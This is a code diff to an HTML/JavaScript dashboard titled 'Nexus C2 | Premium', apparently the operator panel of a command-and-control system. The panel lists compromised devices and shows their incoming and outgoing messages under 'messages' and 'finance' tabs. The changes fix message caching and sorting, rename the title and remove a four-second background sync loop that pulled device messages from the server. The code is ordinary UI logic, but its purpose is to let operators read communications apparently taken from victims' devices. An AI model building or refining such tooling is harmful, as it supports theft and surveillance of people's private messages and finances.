@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus C2 | Premium</title>
+    <title>Nexus C2 | Premium - Realtime v2</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'><stop offset='0%25' stop-color='%2300f0ff'/><stop offset='100%25' stop-color='%230066ff'/></linearGradient></defs><rect width='100' height='100' rx='25' fill='url(%23g)'/><text x='50' y='73' font-family='sans-serif' font-weight='900' font-size='65' fill='%23000' text-anchor='middle'>N</text></svg>">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -2236,7 +2236,9 @@ function renderTab(silent = false) {
 function renderMList() {
     const d = selDev;
     if (!d) return;
-    let allDevMsgs = cache[d._src+':'+d._id] || [];
+    const defaultK = d._src+':'+d._id;
+    const matchingKey = Object.keys(cache || {}).find(key => key.toLowerCase().endsWith(':' + d._id.toLowerCase())) || defaultK;
+    let allDevMsgs = cache[matchingKey] || [];
     
     // Update badge count live
     const badge = document.querySelector('.mhb-badge');
@@ -2250,6 +2252,13 @@ function renderMList() {
     if(mf==='in') msgs = msgs.filter(m => !m.type || m.type === 'incoming');
     if(mf==='out') msgs = msgs.filter(m => m.type === 'outgoing');
     if(q) msgs = msgs.filter(m => `${m.sender||''} ${m.message||''}`.toLowerCase().includes(q));
+
+    // Sort ascending by ID / timestamp so newest is guaranteed to be at the end before reverse
+    msgs.sort((a, b) => {
+        const tA = Number(a.id || a.timestamp || 0);
+        const tB = Number(b.id || b.timestamp || 0);
+        return tA - tB;
+    });
 
     const html = [...msgs].reverse().slice(0,200).map(m => {
         const isOut = m.type === 'outgoing';
@@ -4184,31 +4193,6 @@ function openAddDbDrawer() {
                 renderMList();
             }
         });
-
-        // Silent background auto-sync engine (every 4s) - Guarantees 100% real-time UI without Force Sync clicks
-        setInterval(async () => {
-            if (selDev && (curTab === 'messages' || curTab === 'finance')) {
-                const k = selDev._src + ':' + selDev._id;
-                try {
-                    const r = await fetch(`/api/messages/${selDev._src}/${selDev._id}`, {
-                        headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-                    });
-                    if (r.ok) {
-                        const res = await r.json();
-                        if (res.success && res.data && res.data.length > 0) {
-                            const newMsgs = res.data.map(x => ({ ...x, _localId: x._localId || (Date.now() + '-' + Math.random().toString(36).substr(2, 9)) }));
-                            const oldLength = window.cache && window.cache[k] ? window.cache[k].length : 0;
-                            
-                            if (newMsgs.length > oldLength) {
-                                if (!window.cache) window.cache = {};
-                                window.cache[k] = newMsgs;
-                                renderMList();
-                            }
-                        }
-                    }
-                } catch(e) {}
-            }
-        }, 4000);
     </script>
 </body>
 </html>
